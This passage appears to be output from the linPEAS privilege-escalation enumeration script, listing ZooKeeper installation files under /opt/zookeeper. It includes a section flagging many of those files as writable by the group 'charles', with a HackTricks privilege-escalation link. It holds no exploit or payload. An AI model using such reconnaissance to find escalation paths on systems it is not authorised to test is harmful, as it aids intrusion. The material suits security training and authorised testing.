+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/class-use/UpgradeMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/package-frame.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/package-summary.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/package-tree.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/package-use.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/UpgradeMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/ZooKeeperServerMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/WatchedEvent.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/Watcher.Event.EventType.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/Watcher.Event.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/Watcher.Event.KeeperState.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/Watcher.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/overview-frame.html
+/opt/zookeeper/docs/api/overview-summary.html
+/opt/zookeeper/docs/api/overview-tree.html
+/opt/zookeeper/docs/api/package-list
+/opt/zookeeper/docs/api/resources
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/bookkeeperConfig.html
+/opt/zookeeper/docs/bookkeeperOverview.html
+/opt/zookeeper/docs/bookkeeperProgrammer.html
+/opt/zookeeper/docs/bookkeeperStarted.html
+/opt/zookeeper/docs/bookkeeperStream.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/images/favicon.ico
+/opt/zookeeper/docs/index.html
+/opt/zookeeper/docs/javaExample.html
+/opt/zookeeper/docs/jdiff
+/opt/zookeeper/docs/jdiff/changes
+/opt/zookeeper/docs/jdiff/changes/alldiffs_index_additions.html
+/opt/zookeeper/docs/jdiff/changes/alldiffs_index_all.html
+/opt/zookeeper/docs/jdiff/changes/alldiffs_index_changes.html
+/opt/zookeeper/docs/jdiff/changes/alldiffs_index_removals.html
+/opt/zookeeper/docs/jdiff/changes/changes-summary.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/jdiff/changes.html
+/opt/zookeeper/docs/jdiff/changes/jdiff_help.html
+/opt/zookeeper/docs/jdiff/changes/jdiff_statistics.html
+/opt/zookeeper/docs/jdiff/changes/jdiff_topleftframe.html
+/opt/zookeeper/docs/jdiff/changes/methods_index_additions.html
+/opt/zookeeper/docs/jdiff/changes/methods_index_all.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/jdiff/missingSinces.txt
+/opt/zookeeper/docs/jdiff/stylesheet-jdiff.css
+/opt/zookeeper/docs/jdiff/user_comments_for_zookeeper_3.1.1_to_zookeeper_3.4.6.xml
+/opt/zookeeper/docs/linkmap.html
+/opt/zookeeper/docs/recipes.html
+/opt/zookeeper/docs/releasenotes.html
+/opt/zookeeper/docs/skin
+/opt/zookeeper/docs/skin/basic.css
+/opt/zookeeper/docs/skin/breadcrumbs.js
+/opt/zookeeper/docs/skin/breadcrumbs-optimized.js
+/opt/zookeeper/docs/skin/CommonMessages_de.xml
+/opt/zookeeper/docs/skin/CommonMessages_en_US.xml
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/skin/images/README.txt
+/opt/zookeeper/docs/skin/menu.js
+/opt/zookeeper/docs/skin/note.txt
+/opt/zookeeper/docs/skin/print.css
+/opt/zookeeper/docs/skin/profile.css
+/opt/zookeeper/docs/skin/prototype.js
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/zookeeperAdmin.html
+/opt/zookeeper/docs/zookeeperHierarchicalQuorums.html
+/opt/zookeeper/docs/zookeeperInternals.html
+/opt/zookeeper/docs/zookeeperJMX.html
+/opt/zookeeper/docs/zookeeperObservers.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/index.html
+/opt/zookeeper/index.html.1
+/opt/zookeeper/index.html.2
+/opt/zookeeper/index.html.3
+/opt/zookeeper/ivysettings.xml
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/lib/cobertura
+/opt/zookeeper/lib/cobertura/README.txt
+/opt/zookeeper/lib/jdiff
+/opt/zookeeper/lib/jdiff/zookeeper_3.1.1.xml
+/opt/zookeeper/lib/jdiff/zookeeper_3.4.6-SNAPSHOT.xml
+/opt/zookeeper/lib/jdiff/zookeeper_3.4.6.xml
+/opt/zookeeper/lib/jline-0.9.94.jar
+/opt/zookeeper/lib/jline-0.9.94.LICENSE.txt
+/opt/zookeeper/lib/log4j-1.2.16.jar
+/opt/zookeeper/lib/log4j-1.2.16.LICENSE.txt
+/opt/zookeeper/lib/netty-3.7.0.Final.jar
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/LICENSE.txt
+/opt/zookeeper/NOTICE.txt
+/opt/zookeeper/README_packaging.txt
+/opt/zookeeper/README.txt
+/opt/zookeeper/recipes
+/opt/zookeeper/recipes/election
+/opt/zookeeper/recipes/election/build.xml
+/opt/zookeeper/recipes/election/src
+/opt/zookeeper/recipes/election/src/java
+/opt/zookeeper/recipes/election/src/java/org
+/opt/zookeeper/recipes/election/src/java/org/apache
+/opt/zookeeper/recipes/election/src/java/org/apache/zookeeper
+/opt/zookeeper/recipes/election/src/java/org/apache/zookeeper/recipes
+/opt/zookeeper/recipes/election/src/java/org/apache/zookeeper/recipes/leader
+/opt/zookeeper/recipes/election/src/java/org/apache/zookeeper/recipes/leader/LeaderElectionAware.java
+/opt/zookeeper/recipes/election/src/java/org/apache/zookeeper/recipes/leader/LeaderElectionSupport.java
+/opt/zookeeper/recipes/election/src/java/org/apache/zookeeper/recipes/leader/LeaderOffer.java
+/opt/zookeeper/recipes/election/test
+/opt/zookeeper/recipes/election/test/org
+/opt/zookeeper/recipes/election/test/org/apache
+/opt/zookeeper/recipes/election/test/org/apache/zookeeper
+/opt/zookeeper/recipes/election/test/org/apache/zookeeper/recipes
+/opt/zookeeper/recipes/election/test/org/apache/zookeeper/recipes/leader
+/opt/zookeeper/recipes/election/test/org/apache/zookeeper/recipes/leader/LeaderElectionSupportTest.java
+/opt/zookeeper/recipes/lock
+/opt/zookeeper/recipes/lock/build.xml
+/opt/zookeeper/recipes/lock/src
+/opt/zookeeper/recipes/lock/src/c
+/opt/zookeeper/recipes/lock/src/c/acinclude.m4
+/opt/zookeeper/recipes/lock/src/c/aminclude.am
+/opt/zookeeper/recipes/lock/src/c/c-doc.Doxyfile
+/opt/zookeeper/recipes/lock/src/c/configure.ac
+/opt/zookeeper/recipes/lock/src/c/include
+/opt/zookeeper/recipes/lock/src/c/include/zoo_lock.h
+/opt/zookeeper/recipes/lock/src/c/INSTALL
+/opt/zookeeper/recipes/lock/src/c/LICENSE
+/opt/zookeeper/recipes/lock/src/c/Makefile.am
+/opt/zookeeper/recipes/lock/src/c/README.txt
+/opt/zookeeper/recipes/lock/src/c/src
+/opt/zookeeper/recipes/lock/src/c/src/zoo_lock.c
+/opt/zookeeper/recipes/lock/src/c/tests
+/opt/zookeeper/recipes/lock/src/c/tests/TestClient.cc
+/opt/zookeeper/recipes/lock/src/c/tests/TestDriver.cc
+/opt/zookeeper/recipes/lock/src/c/tests/Util.cc
+/opt/zookeeper/recipes/lock/src/c/tests/Util.h
+/opt/zookeeper/recipes/lock/src/c/tests/zkServer.sh
+/opt/zookeeper/recipes/lock/src/java
+/opt/zookeeper/recipes/lock/src/java/org
+/opt/zookeeper/recipes/lock/src/java/org/apache
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper/recipes
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper/recipes/lock
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/LockListener.java
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/ProtocolSupport.java
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/WriteLock.java
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/ZNodeName.java
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/ZooKeeperOperation.java
+/opt/zookeeper/recipes/lock/test
+/opt/zookeeper/recipes/lock/test/org
+/opt/zookeeper/recipes/lock/test/org/apache
+/opt/zookeeper/recipes/lock/test/org/apache/zookeeper
+/opt/zookeeper/recipes/lock/test/org/apache/zookeeper/recipes
+/opt/zookeeper/recipes/lock/test/org/apache/zookeeper/recipes/lock
+/opt/zookeeper/recipes/lock/test/org/apache/zookeeper/recipes/lock/WriteLockTest.java
+/opt/zookeeper/recipes/lock/test/org/apache/zookeeper/recipes/lock/ZNodeNameTest.java
+/opt/zookeeper/recipes/queue
+/opt/zookeeper/recipes/queue/build.xml
+/opt/zookeeper/recipes/queue/src
+/opt/zookeeper/recipes/queue/src/c
+/opt/zookeeper/recipes/queue/src/c/acinclude.m4
+/opt/zookeeper/recipes/queue/src/c/aminclude.am
+/opt/zookeeper/recipes/queue/src/c/c-doc.Doxyfile
+/opt/zookeeper/recipes/queue/src/c/configure.ac
+/opt/zookeeper/recipes/queue/src/c/include
+/opt/zookeeper/recipes/queue/src/c/include/zoo_queue.h
+/opt/zookeeper/recipes/queue/src/c/INSTALL
+/opt/zookeeper/recipes/queue/src/c/LICENSE
+/opt/zookeeper/recipes/queue/src/c/Makefile.am
+/opt/zookeeper/recipes/queue/src/c/README.txt
+/opt/zookeeper/recipes/queue/src/c/src
+/opt/zookeeper/recipes/queue/src/c/src/zoo_queue.c
+/opt/zookeeper/recipes/queue/src/c/tests
+/opt/zookeeper/recipes/queue/src/c/tests/TestClient.cc
+/opt/zookeeper/recipes/queue/src/c/tests/TestDriver.cc
+/opt/zookeeper/recipes/queue/src/c/tests/Util.cc
+/opt/zookeeper/recipes/queue/src/c/tests/Util.h
+/opt/zookeeper/recipes/queue/src/c/tests/zkServer.sh
+/opt/zookeeper/recipes/queue/src/java
+/opt/zookeeper/recipes/queue/src/java/org
+/opt/zookeeper/recipes/queue/src/java/org/apache
+/opt/zookeeper/recipes/queue/src/java/org/apache/zookeeper
+/opt/zookeeper/recipes/queue/src/java/org/apache/zookeeper/recipes
+/opt/zookeeper/recipes/queue/src/java/org/apache/zookeeper/recipes/queue
+/opt/zookeeper/recipes/queue/src/java/org/apache/zookeeper/recipes/queue/DistributedQueue.java
+/opt/zookeeper/recipes/queue/test
+/opt/zookeeper/recipes/queue/test/org
+/opt/zookeeper/recipes/queue/test/org/apache
+/opt/zookeeper/recipes/queue/test/org/apache/zookeeper
+/opt/zookeeper/recipes/queue/test/org/apache/zookeeper/recipes
+/opt/zookeeper/recipes/queue/test/org/apache/zookeeper/recipes/queue
+/opt/zookeeper/recipes/queue/test/org/apache/zookeeper/recipes/queue/DistributedQueueTest.java
+/opt/zookeeper/src
+/opt/zookeeper/src/c
+/opt/zookeeper/src/c/acinclude.m4
+/opt/zookeeper/src/c/aclocal.m4
+/opt/zookeeper/src/c/aminclude.am
+/opt/zookeeper/src/c/autom4te.cache
+/opt/zookeeper/src/c/autom4te.cache/output.0
+/opt/zookeeper/src/c/autom4te.cache/output.1
+/opt/zookeeper/src/c/autom4te.cache/output.2
+/opt/zookeeper/src/c/autom4te.cache/output.3
+/opt/zookeeper/src/c/autom4te.cache/requests
+
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group charles:
+/opt/zookeeper/recipes/election/build.xml
+/opt/zookeeper/recipes/election/src/java/org/apache/zookeeper/recipes/leader/LeaderElectionAware.java
+/opt/zookeeper/recipes/election/src/java/org/apache/zookeeper/recipes/leader/LeaderElectionSupport.java
+/opt/zookeeper/recipes/election/src/java/org/apache/zookeeper/recipes/leader/LeaderOffer.java
+/opt/zookeeper/recipes/election/test/org/apache/zookeeper/recipes/leader/LeaderElectionSupportTest.java
+/opt/zookeeper/recipes/lock/build.xml
+/opt/zookeeper/recipes/lock/src/c/tests/Util.cc
+/opt/zookeeper/recipes/lock/src/c/tests/TestDriver.cc
+/opt/zookeeper/recipes/lock/src/c/tests/TestClient.cc
+/opt/zookeeper/recipes/lock/src/c/tests/Util.h
+/opt/zookeeper/recipes/lock/src/c/src/zoo_lock.c
+/opt/zookeeper/recipes/lock/src/c/c-doc.Doxyfile
+/opt/zookeeper/recipes/lock/src/c/Makefile.am
+/opt/zookeeper/recipes/lock/src/c/include/zoo_lock.h
+/opt/zookeeper/recipes/lock/src/c/acinclude.m4
+/opt/zookeeper/recipes/lock/src/c/configure.ac
+/opt/zookeeper/recipes/lock/src/c/aminclude.am
+/opt/zookeeper/recipes/lock/src/c/LICENSE
+/opt/zookeeper/recipes/lock/src/c/INSTALL
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/WriteLock.java
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/ProtocolSupport.java
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/LockListener.java
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/ZooKeeperOperation.java
+/opt/zookeeper/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/ZNodeName.java
+/opt/zookeeper/recipes/lock/test/org/apache/zookeeper/recipes/lock/WriteLockTest.java
+/opt/zookeeper/recipes/lock/test/org/apache/zookeeper/recipes/lock/ZNodeNameTest.java
+/opt/zookeeper/recipes/queue/build.xml
+/opt/zookeeper/recipes/queue/src/c/tests/Util.cc
+/opt/zookeeper/recipes/queue/src/c/tests/TestDriver.cc
+/opt/zookeeper/recipes/queue/src/c/tests/TestClient.cc
+/opt/zookeeper/recipes/queue/src/c/tests/Util.h
+/opt/zookeeper/recipes/queue/src/c/src/zoo_queue.c
+/opt/zookeeper/recipes/queue/src/c/c-doc.Doxyfile
+/opt/zookeeper/recipes/queue/src/c/Makefile.am
+/opt/zookeeper/recipes/queue/src/c/include/zoo_queue.h
+/opt/zookeeper/recipes/queue/src/c/acinclude.m4
+/opt/zookeeper/recipes/queue/src/c/configure.ac
+/opt/zookeeper/recipes/queue/src/c/aminclude.am
+/opt/zookeeper/recipes/queue/src/c/LICENSE
+/opt/zookeeper/recipes/queue/src/c/INSTALL
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/recipes/queue/src/java/org/apache/zookeeper/recipes/queue/DistributedQueue.java
+/opt/zookeeper/recipes/queue/test/org/apache/zookeeper/recipes/queue/DistributedQueueTest.java
+/opt/zookeeper/zookeeper-3.4.6.jar.sha1
+/opt/zookeeper/build.xml
+/opt/zookeeper/docs/recipes.html
+/opt/zookeeper/docs/bookkeeperConfig.html
+/opt/zookeeper/docs/bookkeeperProgrammer.html
+/opt/zookeeper/docs/zookeeperHierarchicalQuorums.html
+/opt/zookeeper/docs/bookkeeperStarted.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/images/favicon.ico
+/opt/zookeeper/docs/zookeeperQuotas.html
+/opt/zookeeper/docs/bookkeeperStream.html
+/opt/zookeeper/docs/zookeeperObservers.html
+/opt/zookeeper/docs/zookeeperStarted.html
+/opt/zookeeper/docs/linkmap.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/skin/CommonMessages_fr.xml
+/opt/zookeeper/docs/skin/screen.css
+/opt/zookeeper/docs/skin/note.txt
+/opt/zookeeper/docs/skin/breadcrumbs-optimized.js
+/opt/zookeeper/docs/skin/CommonMessages_es.xml
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/skin/images/README.txt
+/opt/zookeeper/docs/skin/profile.css
+/opt/zookeeper/docs/skin/CommonMessages_de.xml
+/opt/zookeeper/docs/skin/fontsize.js
+/opt/zookeeper/docs/skin/menu.js
+/opt/zookeeper/docs/skin/getBlank.js
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/zookeeperJMX.html
+/opt/zookeeper/docs/zookeeperTutorial.html
+/opt/zookeeper/docs/zookeeperProgrammers.html
+/opt/zookeeper/docs/broken-links.xml
+/opt/zookeeper/docs/zookeeperAdmin.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/index.html
+/opt/zookeeper/docs/api/allclasses-frame.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.NodeExistsException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/class-use/KeeperException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/class-use/KeeperException.NodeExistsException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/class-use/ZooKeeperMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/class-use/KeeperException.NotEmptyException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/class-use/KeeperException.DataInconsistencyException.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/org/apache/zookeeper/ZooKeeperMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/package-tree.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.NotEmptyException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.DataInconsistencyException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/AsyncCallback.ChildrenCallback.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/LogFormatter.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/class-use/LogFormatter.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/class-use/ZooKeeperServerMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/class-use/PurgeTxnLog.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/class-use/SnapshotFormatter.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/package-tree.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/ZooKeeperServerMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/package-use.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/package-frame.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/package-summary.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/UpgradeMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/class-use/UpgradeMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/package-tree.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/package-use.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/package-frame.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/package-summary.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/class-use/QuorumPeerMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/package-tree.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/package-use.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/package-frame.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/QuorumPeerMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/package-summary.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/PurgeTxnLog.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/SnapshotFormatter.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/ZooDefs.Perms.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/AsyncCallback.StringCallback.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/AsyncCallback.ACLCallback.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/ZooDefs.Ids.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.UnimplementedException.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/FourLetterWordMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/class-use/FourLetterWordMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/package-tree.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/package-use.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/package-frame.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/package-summary.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.RuntimeInconsistencyException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/ZooDefs.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/Watcher.Event.KeeperState.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/CreateMode.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/ZooKeeper.States.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/ACL.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/Stat.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/class-use/ACL.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/class-use/Stat.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/class-use/StatPersistedV1.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/class-use/Id.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/class-use/StatPersisted.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/package-tree.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/package-use.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/StatPersistedV1.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/package-frame.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/Id.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.InvalidACLException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/ZooKeeper.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.ConnectionLossException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.SessionMovedException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/WatchedEvent.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/help-doc.html
+/opt/zookeeper/docs/api/serialized-form.html
+/opt/zookeeper/docs/api/deprecated-list.html
+/opt/zookeeper/docs/api/overview-summary.html
+/opt/zookeeper/docs/api/constant-values.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/jdiff/changes/fields_index_changes.html
+/opt/zookeeper/docs/jdiff/changes/methods_index_changes.html
+/opt/zookeeper/docs/jdiff/changes/org.apache.zookeeper.ClientCnxn.html
+/opt/zookeeper/docs/jdiff/changes/fields_index_additions.html
+/opt/zookeeper/docs/jdiff/changes/methods_index_all.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/jdiff/changes.html
+/opt/zookeeper/docs/jdiff/missingSinces.txt
+/opt/zookeeper/docs/jdiff/user_comments_for_zookeeper_3.1.1_to_zookeeper_3.4.6.xml
+/opt/zookeeper/docs/jdiff/stylesheet-jdiff.css
+/opt/zookeeper/src/recipes/election/build.xml
+/opt/zookeeper/src/recipes/election/src/java/org/apache/zookeeper/recipes/leader/LeaderElectionAware.java
+/opt/zookeeper/src/recipes/election/src/java/org/apache/zookeeper/recipes/leader/LeaderElectionSupport.java
+/opt/zookeeper/src/recipes/election/src/java/org/apache/zookeeper/recipes/leader/LeaderOffer.java
+/opt/zookeeper/src/recipes/election/test/org/apache/zookeeper/recipes/leader/LeaderElectionSupportTest.java
+/opt/zookeeper/src/recipes/election/README.txt
+/opt/zookeeper/src/recipes/build.xml
+/opt/zookeeper/src/recipes/build-recipes.xml
+/opt/zookeeper/src/recipes/lock/build.xml
+/opt/zookeeper/src/recipes/lock/src/c/tests/Util.cc
+/opt/zookeeper/src/recipes/lock/src/c/tests/TestDriver.cc
+/opt/zookeeper/src/recipes/lock/src/c/tests/TestClient.cc
+/opt/zookeeper/src/recipes/lock/src/c/tests/Util.h
+/opt/zookeeper/src/recipes/lock/src/c/src/zoo_lock.c
+/opt/zookeeper/src/recipes/lock/src/c/c-doc.Doxyfile
+/opt/zookeeper/src/recipes/lock/src/c/Makefile.am
+/opt/zookeeper/src/recipes/lock/src/c/include/zoo_lock.h
+/opt/zookeeper/src/recipes/lock/src/c/acinclude.m4
+/opt/zookeeper/src/recipes/lock/src/c/configure.ac
+/opt/zookeeper/src/recipes/lock/src/c/aminclude.am
+/opt/zookeeper/src/recipes/lock/src/c/LICENSE
+/opt/zookeeper/src/recipes/lock/src/c/INSTALL
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/WriteLock.java
+/opt/zookeeper/src/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/ProtocolSupport.java
+/opt/zookeeper/src/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/LockListener.java
+/opt/zookeeper/src/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/ZooKeeperOperation.java
+/opt/zookeeper/src/recipes/lock/src/java/org/apache/zookeeper/recipes/lock/ZNodeName.java
+/opt/zookeeper/src/recipes/lock/test/org/apache/zookeeper/recipes/lock/WriteLockTest.java
+/opt/zookeeper/src/recipes/lock/test/org/apache/zookeeper/recipes/lock/ZNodeNameTest.java
+/opt/zookeeper/src/recipes/lock/README.txt
+/opt/zookeeper/src/recipes/queue/build.xml
+/opt/zookeeper/src/recipes/queue/src/c/tests/Util.cc
+/opt/zookeeper/src/recipes/queue/src/c/tests/TestDriver.cc
+/opt/zookeeper/src/recipes/queue/src/c/tests/TestClient.cc
+/opt/zookeeper/src/recipes/queue/src/c/tests/Util.h
+/opt/zookeeper/src/recipes/queue/src/c/src/zoo_queue.c
+/opt/zookeeper/src/recipes/queue/src/c/c-doc.Doxyfile
+/opt/zookeeper/src/recipes/queue/src/c/Makefile.am
+/opt/zookeeper/src/recipes/queue/src/c/include/zoo_queue.h
+/opt/zookeeper/src/recipes/queue/src/c/acinclude.m4
+/opt/zookeeper/src/recipes/queue/src/c/configure.ac
+/opt/zookeeper/src/recipes/queue/src/c/aminclude.am
+/opt/zookeeper/src/recipes/queue/src/c/LICENSE
+/opt/zookeeper/src/recipes/queue/src/c/INSTALL
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/recipes/queue/src/java/org/apache/zookeeper/recipes/queue/DistributedQueue.java
+/opt/zookeeper/src/recipes/queue/test/org/apache/zookeeper/recipes/queue/DistributedQueueTest.java
+/opt/zookeeper/src/recipes/queue/README.txt
+/opt/zookeeper/src/recipes/README.txt
+/opt/zookeeper/src/docs/status.xml
+/opt/zookeeper/src/docs/src/documentation/skinconf.xml
+/opt/zookeeper/src/docs/src/documentation/classes/CatalogManager.properties
+/opt/zookeeper/src/docs/src/documentation/resources/images/state_dia.dia
+/opt/zookeeper/src/docs/src/documentation/resources/images/favicon.ico
+/opt/zookeeper/src/docs/src/documentation/content/xdocs/recipes.xml
+/opt/zookeeper/src/docs/src/documentation/content/xdocs/zookeeperProgrammers.xml
+/opt/zookeeper/src/docs/src/documentation/content/xdocs/index.xml
+/opt/zookeeper/src/docs/src/documentation/content/xdocs/site.xml
+/opt/zookeeper/src/docs/src/documentation/content/xdocs/zookeeperJMX.xml
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/docs/src/documentation/TODO.txt
+/opt/zookeeper/src/docs/src/documentation/README.txt
+/opt/zookeeper/src/docs/forrest.properties
+/opt/zookeeper/src/c/zookeeper.vcproj
+/opt/zookeeper/src/c/README
+/opt/zookeeper/src/c/aclocal.m4
+/opt/zookeeper/src/c/config.h.in
+/opt/zookeeper/src/c/tests/Vector.h
+/opt/zookeeper/src/c/tests/ThreadingUtil.h
+/opt/zookeeper/src/c/tests/CppAssertHelper.h
+/opt/zookeeper/src/c/tests/ZKMocks.cc
+/opt/zookeeper/src/c/tests/Util.cc
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/c/src/cli.c
+/opt/zookeeper/src/c/src/st_adaptor.c
+/opt/zookeeper/src/c/src/winport.h
+/opt/zookeeper/src/c/src/zk_log.c
+/opt/zookeeper/src/c/src/mt_adaptor.c
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/c/src/hashtable/hashtable.c
+/opt/zookeeper/src/c/src/hashtable/hashtable_itr.h
+/opt/zookeeper/src/c/src/hashtable/hashtable.h
+/opt/zookeeper/src/c/src/hashtable/hashtable_itr.c
+/opt/zookeeper/src/c/src/hashtable/LICENSE.txt
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/c/src/load_gen.c
+/opt/zookeeper/src/c/src/zk_hashtable.c
+/opt/zookeeper/src/c/src/winport.c
+/opt/zookeeper/src/c/c-doc.Doxyfile
+/opt/zookeeper/src/c/Makefile.am
+/opt/zookeeper/src/c/ChangeLog
+/opt/zookeeper/src/c/zookeeper.sln
+/opt/zookeeper/src/c/Cli.vcproj
+/opt/zookeeper/src/c/include/zookeeper.h
+/opt/zookeeper/src/c/include/winconfig.h
+/opt/zookeeper/src/c/include/winstdint.h
+/opt/zookeeper/src/c/include/zookeeper_version.h
+/opt/zookeeper/src/c/include/proto.h
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/c/Makefile.in
+/opt/zookeeper/src/c/autom4te.cache/output.0
+/opt/zookeeper/src/c/autom4te.cache/traces.3
+/opt/zookeeper/src/c/autom4te.cache/traces.2
